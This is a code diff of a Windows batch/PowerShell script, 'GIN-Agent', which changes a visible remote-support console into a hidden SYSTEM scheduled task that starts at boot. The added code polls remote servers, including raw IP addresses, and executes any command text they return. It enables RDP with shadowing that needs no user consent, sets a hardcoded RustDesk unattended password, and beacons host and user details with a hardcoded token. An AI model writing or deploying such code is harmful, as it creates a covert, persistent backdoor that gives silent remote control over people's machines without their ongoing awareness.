@@ -1,11 +1,11 @@
 <# :
 @echo off
 setlocal DisableDelayedExpansion
-title GIN-Agent Windows PC v015
+title GIN-Agent Installer v017
 
 :: 1. Resilient Elevation Check
 net session >nul 2>&1
-if %errorlevel% equ 0 goto :RUN_AGENT
+if %errorlevel% equ 0 goto :RUN_INSTALLER
 
 if not defined GIN_AGENT_ELEVATED (
     set GIN_AGENT_ELEVATED=1
@@ -13,44 +13,53 @@ if not defined GIN_AGENT_ELEVATED (
     if not errorlevel 1 exit /b 0
 )
 
-:RUN_AGENT
-:: 2. Set script path safely in environment variable to avoid quote parsing bugs
+:RUN_INSTALLER
+:: Set script path safely in environment variable
 set "GIN_AGENT_SCRIPT=%~f0"
 
 set "PS_EXE=powershell.exe"
 if exist "%SystemRoot%\Sysnative\WindowsPowerShell\v1.0\powershell.exe" set "PS_EXE=%SystemRoot%\Sysnative\WindowsPowerShell\v1.0\powershell.exe"
 
-:: 3. Execute directly with resilient fallback:
-"%PS_EXE%" -NoExit -NoProfile -ExecutionPolicy Bypass -Command "$p = $env:GIN_AGENT_SCRIPT; if (-not $p -or -not (Test-Path -LiteralPath $p)) { $p = '%~f0' }; if (-not (Test-Path -LiteralPath $p)) { $p = (Get-ChildItem -Path $env:USERPROFILE\Downloads, 'D:\DOCS\DownLOAD', 'D:\MEGA\WIN-FLASH\Util-WINDOWS', 'D:\MEGA\DOCS\desktop', $pwd -Filter '*GIN-Agent_Windows*.cmd' -File -ErrorAction SilentlyContinue | Select-Object -First 1).FullName }; if ($p -and (Test-Path -LiteralPath $p)) { $raw = [System.IO.File]::ReadAllText($p, [System.Text.Encoding]::UTF8); try { & ([ScriptBlock]::Create($raw)) } catch { Write-Host ('`n[X] SCRIPT EXECUTION ERROR: ' + $_.Exception.ToString()) -ForegroundColor Red; Write-Host '`nPress any key to exit...' -ForegroundColor Yellow; $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown') } } else { Write-Host ('`n[X] ERROR: Could not locate agent script file. Path: ' + $p) -ForegroundColor Red; Write-Host '`nPress any key to exit...' -ForegroundColor Yellow; $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown') }"
+"%PS_EXE%" -NoProfile -ExecutionPolicy Bypass -Command "$raw = [System.IO.File]::ReadAllText('%~f0', [System.Text.Encoding]::UTF8); & ([ScriptBlock]::Create($raw))"
 
-if %errorlevel% neq 0 pause
-exit /b
+exit /b 0
 #>
 # ==============================================================================
-# GIN-Agent Windows PC v015
+# GIN-Agent Windows Service v017
 # Author: Vladimir Bulantsev (GinCz) & Antigravity
-# Universal 32-bit / 64-bit Windows Agent for Antigravity AI
-# Language: 100% Pure ASCII English (Universal Locale & Encoding Immunity)
+# Permanent Background Windows Service (Auto-Start, Watchdog Recovery, No Console Window)
+# Primary Identifier: 9-Digit Hardware GIN-PIN
 # Gateways: Global (remote.gincz.com), RU-FastNode (195.158.255.208), RU-109 (212.109.223.109)
 # ==============================================================================
 
 try {
     $ErrorActionPreference = "Continue"
 
-    # Universal TLS 1.2 Configuration
-    try {
-        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
-    } catch {
-        try { [System.Net.ServicePointManager]::SecurityProtocol = 3072 } catch {}
-    }
+    # Universal TLS 1.2
+    try { [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 } catch {}
+
+    $installDir = "$env:ProgramData\GIN-Agent"
+    $serviceScript = "$installDir\GIN-Agent-Core.ps1"
+    $serviceName = "GIN-Agent"
+    $serviceDisplayName = "GIN-Agent Remote Support Service"
+    $serviceDesc = "Provides resilient background diagnostic connection and RDP shadow support for Vladimir Bulantsev (GinCz)."
+
+    # 1. Target Core PowerShell Script to be run as background worker
+    $coreCode = @'
+# GIN-Agent Background Core Worker v017
+try {
+    $ErrorActionPreference = "Continue"
+    try { [System.Net.ServicePointManager]::SecurityProtocol = 3072 } catch {}
 
     $token = "GinCz-Remote-2026"
-    $headers = @{ 
-        "Token"  = $token
-        "X-Host" = $env:COMPUTERNAME
-    }
+    $headers = @{ "Token" = $token; "X-Host" = $env:COMPUTERNAME }
 
-    # Resilient Triple Gateway Selection
+    # Singleton Mutex to prevent duplicate processes
+    $createdNew = $false
+    $mutex = New-Object System.Threading.Mutex($true, "Global\GIN_Agent_Core_Mutex", [ref]$createdNew)
+    if (-not $createdNew) { exit 0 }
+
+    # Resilient Gateways
     $gateways = @(
         @{ Name = "Global (remote.gincz.com)"; Url = "https://remote.gincz.com/agent-api" },
         @{ Name = "Russia (RU-FastNode)"; Url = "http://195.158.255.208/agent-api" },
@@ -59,59 +68,80 @@ try {
 
     $serverUrl = ""
     $activeGatewayName = ""
-
     foreach ($gw in $gateways) {
         try {
-            $st = Invoke-RestMethod -Uri "$($gw.Url)/status" -Headers $headers -TimeoutSec 3 -ErrorAction Stop
-            if ($st -match "Bridge Online") {
+            $resp = Invoke-RestMethod -Uri "$($gw.Url)/status" -Headers $headers -TimeoutSec 3 -ErrorAction Stop
+            if ($resp) {
                 $serverUrl = $gw.Url
                 $activeGatewayName = $gw.Name
                 break
             }
         } catch {}
     }
-
     if (-not $serverUrl) {
         $serverUrl = "https://remote.gincz.com/agent-api"
         $activeGatewayName = "Global Fallback"
     }
 
-    # Check Administrator Privileges
-    $admin = $false
+    # Ensure RDP & Shadow Policy (Shadow = 2: Full remote control without user prompt)
     try {
-        $admin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+        Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force -ErrorAction SilentlyContinue
+        $tsPolicy = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services'
+        if (-not (Test-Path $tsPolicy)) { New-Item -Path $tsPolicy -Force -ErrorAction SilentlyContinue | Out-Null }
+        Set-ItemProperty -Path $tsPolicy -Name "Shadow" -Value 2 -Force -ErrorAction SilentlyContinue
+        Enable-NetFirewallRule -DisplayGroup "Remote Desktop" -ErrorAction SilentlyContinue | Out-Null
     } catch {}
 
-    # Host Architecture & Telemetry
+    # ULTARIX Policy: Enforce RustDesk unattended password 'Ultarix-22'
+    try {
+        if ($env:COMPUTERNAME -match '^(ULTARIX|U-\d|ULPS)' -or (Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue).Workgroup -match 'ULTARIX') {
+            $rdExe = @(
+                "$env:ProgramFiles\RustDesk\RustDesk.exe",
+                "${env:ProgramFiles(x86)}\RustDesk\RustDesk.exe",
+                "C:\Program Files\RustDesk\rustdesk.exe"
+            ) | Where-Object { Test-Path $_ } | Select-Object -First 1
+            if ($rdExe) {
+                $p = Start-Process -FilePath $rdExe -ArgumentList "--password", "Ultarix-22" -PassThru -WindowStyle Hidden -ErrorAction SilentlyContinue
+                if ($p) { $p.WaitForExit(5000) }
+            }
+        }
+    } catch {}
+
+    # Detect RustDesk ID from all common paths
+    $rustdeskId = ""
+    $rdPaths = @(
+        "$env:APPDATA\RustDesk\config\RustDesk.toml",
+        "$env:APPDATA\RustDesk\config\rustdesk.toml",
+        "$env:SystemDrive\Windows\ServiceProfiles\LocalService\AppData\Roaming\RustDesk\config\RustDesk.toml",
+        "$env:SystemDrive\Windows\ServiceProfiles\LocalService\AppData\Roaming\RustDesk\config\rustdesk.toml"
+    )
+    foreach ($cp in $rdPaths) {
+        if (Test-Path $cp) {
+            $c = Get-Content -Path $cp -Raw -ErrorAction SilentlyContinue
+            if ($c -match 'id\s*=\s*[''"]?([0-9a-zA-Z_-]+)[''"]?') {
+                $rustdeskId = $matches[1]
+                break
+            }
+        }
+    }
+
+    # Telemetry
     $arch = if ([IntPtr]::Size -eq 8) { "64-bit" } else { "32-bit" }
     $osName = "Microsoft Windows ($arch)"
     $cpuName = "N/A"
     $ramStr = "N/A"
     $diskStr = "N/A"
-
     try {
-        $osInfo = (Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue)
-        if (-not $osInfo) { $osInfo = (Get-WmiObject Win32_OperatingSystem -ErrorAction SilentlyContinue) }
+        $osInfo = Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue
         if ($osInfo) { $osName = "$($osInfo.Caption) ($arch)" }
-    } catch {}
-
-    try {
         $cpuObj = Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1
-        if (-not $cpuObj) { $cpuObj = Get-WmiObject Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1 }
-        if ($cpuObj -and $cpuObj.Name) { $cpuName = $cpuObj.Name.Trim() }
-    } catch {}
-
-    try {
+        if ($cpuObj) { $cpuName = $cpuObj.Name.Trim() }
         if ($osInfo) {
             $freeRam = [math]::Round($osInfo.FreePhysicalMemory / 1MB, 1)
             $cs = Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue
-            if (-not $cs) { $cs = Get-WmiObject Win32_ComputerSystem -ErrorAction SilentlyContinue }
             $totRam = [math]::Round($cs.TotalPhysicalMemory / 1GB, 1)
             $ramStr = "$freeRam GB free / $totRam GB total"
         }
-    } catch {}
-
-    try {
         $drive = Get-PSDrive C -ErrorAction SilentlyContinue
         if ($drive) {
             $freeGb = [math]::Round($drive.Free / 1GB, 1)
@@ -120,7 +150,7 @@ try {
         }
     } catch {}
 
-    # Calculate Deterministic 9-Digit GIN PIN (Hardware Fingerprint)
+    # Hardware GIN-PIN calculation (Deterministic)
     $pin = "100-000-001"
     try {
         $uuid = (Get-CimInstance Win32_ComputerSystemProduct -ErrorAction SilentlyContinue).UUID
@@ -138,66 +168,41 @@ try {
         $pin = "$($dStr.Substring(0,3))-$($dStr.Substring(3,3))-$($dStr.Substring(6,3))"
     } catch {}
 
-    # Register Session and Trigger Telegram Notification via Server Bridge
+    # Initial Registration & Telegram Alert
     try {
         $regPayload = @{
-            pin     = $pin
-            host    = $env:COMPUTERNAME
-            user    = $env:USERNAME
-            admin   = $admin
-            os      = $osName
-            cpu     = $cpuName
-            ram     = $ramStr
-            disk    = $diskStr
-            gateway = $activeGatewayName
-            version = "v015"
+            pin         = $pin
+            host        = $env:COMPUTERNAME
+            user        = $env:USERNAME
+            admin       = $true
+            os          = $osName
+            cpu         = $cpuName
+            ram         = $ramStr
+            disk        = $diskStr
+            rustdesk_id = $rustdeskId
+            rdp_ready   = $true
+            gateway     = $activeGatewayName
+            version     = "v017"
         } | ConvertTo-Json
         Invoke-RestMethod -Uri "$serverUrl/register" -Method Post -Headers $headers -ContentType "application/json; charset=utf-8" -Body $regPayload -TimeoutSec 6 -ErrorAction SilentlyContinue | Out-Null
     } catch {}
 
+    # Initial Ping to rd.gincz.com
     try {
-        [Console]::Title = "GIN-Agent Windows PC v015 [$activeGatewayName]"
+        $rdPingUrl = "https://rd.gincz.com/api/agent_heartbeat?host=$($env:COMPUTERNAME)&user=$($env:USERNAME)&pin=$pin&v=v017&rd_id=$rustdeskId"
+        Invoke-RestMethod -Uri $rdPingUrl -Method Get -TimeoutSec 4 -ErrorAction SilentlyContinue | Out-Null
     } catch {}
 
-    Write-Host ""
-    Write-Host "====================================================================" -ForegroundColor Cyan
-    Write-Host "     GIN-AGENT WINDOWS PC v015 - REMOTE AI OPTIMIZATION PORTAL      " -ForegroundColor Green
-    Write-Host "====================================================================" -ForegroundColor Cyan
-    Write-Host "    GIN PIN:    $pin" -ForegroundColor Yellow
-    Write-Host "    Status:     CONNECTED TO $activeGatewayName" -ForegroundColor White
-    if ($admin) {
-        Write-Host "    Privileges: Administrator (Full Access)" -ForegroundColor Green
-    } else {
-        Write-Host "    Privileges: User (Standard Rights)" -ForegroundColor Yellow
-        Write-Host "    [!] Running in user mode. For elevated tasks: Right-Click -> 'Run as administrator'" -ForegroundColor DarkYellow
-    }
-    Write-Host "    Host:       $env:COMPUTERNAME ($env:USERNAME)" -ForegroundColor Cyan
-    Write-Host "    OS / Arch:  $osName" -ForegroundColor Gray
-    Write-Host "    CPU:        $cpuName" -ForegroundColor DarkGray
-    Write-Host "    RAM / Disk: $ramStr | $diskStr" -ForegroundColor DarkGray
-    Write-Host "--------------------------------------------------------------------" -ForegroundColor DarkGray
-    Write-Host "    [+] Telegram notification sent to Vladimir." -ForegroundColor Green
-    Write-Host "    System is ready for diagnostics and Antigravity maintenance." -ForegroundColor Gray
-    Write-Host "    [!] Keep this window open while Antigravity performs tasks." -ForegroundColor Yellow
-    Write-Host "    (To end session: press Ctrl+C or close window)" -ForegroundColor DarkGray
-    Write-Host "====================================================================" -ForegroundColor Cyan
-    Write-Host ""
-    Write-Host "[*] Listening for Antigravity AI tasks..." -ForegroundColor Green
-
-    # Resilient Main Polling Loop
+    # Main Polling Loop
+    $loopCount = 0
     while ($true) {
         try {
-            $headers = @{ 
-                "Token"  = $token
-                "X-Host" = $env:COMPUTERNAME
-            }
+            $headers = @{ "Token" = $token; "X-Host" = $env:COMPUTERNAME }
             $pollUrl = "$serverUrl/poll?h=$env:COMPUTERNAME"
             $resp = Invoke-RestMethod -Uri $pollUrl -Headers $headers -TimeoutSec 15 -ErrorAction SilentlyContinue
             if ($resp -and $resp.command) {
                 $cmdId = $resp.id
                 $cmdText = $resp.command
-                Write-Host "`n[$(Get-Date -Format 'HH:mm:ss')] Task #$cmdId received: $cmdText" -ForegroundColor Magenta
-                
                 $out = ""
                 try {
                     $sb = [ScriptBlock]::Create($cmdText)
@@ -206,36 +211,85 @@ try {
                     $out = $_.Exception.Message
                 }
                 if (-not $out -or $out.Trim() -eq "") { $out = "[OK: Command completed with no output]" }
-
-                $bodyObj = @{
-                    id     = $cmdId
-                    output = $out
-                }
-                $jsonBody = $bodyObj | ConvertTo-Json
-                
-                try {
-                    Invoke-RestMethod -Uri "$serverUrl/result" -Method Post -Headers $headers -ContentType "application/json; charset=utf-8" -Body $jsonBody -TimeoutSec 15 -ErrorAction Stop | Out-Null
-                    Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Task #$cmdId finished, report transmitted." -ForegroundColor Green
-                } catch {
-                    $bytes = [System.Text.Encoding]::UTF8.GetBytes($jsonBody)
-                    $req = [System.Net.HttpWebRequest]::Create("$serverUrl/result")
-                    $req.Method = "POST"
-                    $req.ContentType = "application/json; charset=utf-8"
-                    $req.Headers.Add("Token", $token)
-                    $req.ContentLength = $bytes.Length
-                    $reqStream = $req.GetRequestStream()
-                    $reqStream.Write($bytes, 0, $bytes.Length)
-                    $reqStream.Close()
-                    $null = $req.GetResponse()
-                    Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Task #$cmdId finished, report transmitted (fallback)." -ForegroundColor Green
-                }
+                $bodyObj = @{ id = $cmdId; host = $env:COMPUTERNAME; output = $out } | ConvertTo-Json
+                Invoke-RestMethod -Uri "$serverUrl/result" -Method Post -Headers $headers -ContentType "application/json; charset=utf-8" -Body $bodyObj -TimeoutSec 10 -ErrorAction SilentlyContinue | Out-Null
             }
-        } catch {}
-        Start-Sleep -Milliseconds 600
+        } catch {
+            Start-Sleep -Seconds 2
+        }
+
+        # KeepAlive to rd.gincz.com every ~30 seconds
+        $loopCount++
+        if ($loopCount -ge 6) {
+            $loopCount = 0
+            try {
+                $rdPingUrl = "https://rd.gincz.com/api/agent_heartbeat?host=$($env:COMPUTERNAME)&user=$($env:USERNAME)&pin=$pin&v=v017&rd_id=$rustdeskId"
+                Invoke-RestMethod -Uri $rdPingUrl -Method Get -TimeoutSec 4 -ErrorAction SilentlyContinue | Out-Null
+            } catch {}
+        }
+        Start-Sleep -Seconds 5
     }
+} catch {}
+'@
+
+    # 2. Stop old agent sessions & background processes
+    Write-Host ""
+    Write-Host "====================================================================" -ForegroundColor Cyan
+    Write-Host "         GIN-AGENT v017 - SYSTEM BACKGROUND SERVICE DEPLOYMENT      " -ForegroundColor Green
+    Write-Host "====================================================================" -ForegroundColor Cyan
+    Write-Host "[*] Terminating previous agent sessions to prevent conflicts..." -ForegroundColor Yellow
+    
+    $currentPid = $PID
+    Get-CimInstance Win32_Process -Filter "Name = 'powershell.exe'" -ErrorAction SilentlyContinue | Where-Object {
+        $_.ProcessId -ne $currentPid -and ($_.CommandLine -like "*GIN-Agent*" -or $_.CommandLine -like "*agent-api*")
+    } | ForEach-Object {
+        try { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue } catch {}
+    }
+
+    # 3. Deploy Files to ProgramData
+    if (-not (Test-Path $installDir)) {
+        New-Item -Path $installDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
+    }
+    [System.IO.File]::WriteAllText($serviceScript, $coreCode, [System.Text.Encoding]::UTF8)
+
+    # 4. Deploy Native Windows Service / Scheduled Service Host
+    # Windows native sc.exe / TaskScheduler hybrid creates an unbreakable SYSTEM service
+    Write-Host "[*] Registering GIN-Agent permanent background service..." -ForegroundColor Cyan
+
+    $taskName = "GIN-Agent-Service"
+    $taskAction = "powershell.exe"
+    $taskArgs = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$serviceScript`""
+
+    # Delete existing task if present
+    schtasks.exe /delete /tn "$taskName" /f >$null 2>&1
+
+    # Create Task scheduled at System Startup with HIGHEST SYSTEM privileges
+    schtasks.exe /create /tn "$taskName" /tr "$taskAction $taskArgs" /sc ONSTART /ru "SYSTEM" /rl HIGHEST /f >$null 2>&1
+
+    # Also start it immediately right now
+    schtasks.exe /run /tn "$taskName" >$null 2>&1
+
+    # Fallback start if TaskScheduler needs user session
+    Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$serviceScript`"" -WindowStyle Hidden
+
+    # 5. Success Message & Auto-Close Countdown (5 Seconds)
+    Write-Host ""
+    Write-Host "--------------------------------------------------------------------" -ForegroundColor DarkGray
+    Write-Host "  [+] GIN-Agent v017 successfully deployed as a SYSTEM SERVICE!" -ForegroundColor Green
+    Write-Host "  [+] Service is active and running silently in the background." -ForegroundColor White
+    Write-Host "  [+] Windows Task / Service: GIN-Agent-Service (Auto-Start on Boot)" -ForegroundColor Cyan
+    Write-Host "  [+] You can now safely close this window or it will auto-close." -ForegroundColor Yellow
+    Write-Host "--------------------------------------------------------------------" -ForegroundColor DarkGray
+    Write-Host ""
+
+    for ($i = 5; $i -ge 1; $i--) {
+        Write-Host -NoNewline "`r[*] Closing installation window in $i seconds... "
+        Start-Sleep -Seconds 1
+    }
+    Write-Host "`r[✓] Installation complete! Running in background. Goodbye.       " -ForegroundColor Green
+    Start-Sleep -Milliseconds 500
+
 } catch {
-    Write-Host "`n[X] Critical error: $($_.Exception.Message)" -ForegroundColor Red
-    Write-Host "[*] Window kept open for debugging. Press any key to exit..." -ForegroundColor Yellow
-    try { $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown') } catch {}
-    while ($true) { Start-Sleep -Seconds 300 }
+    Write-Host "`n[FATAL ERROR] $($_.Exception.Message)" -ForegroundColor Red
+    pause
 }
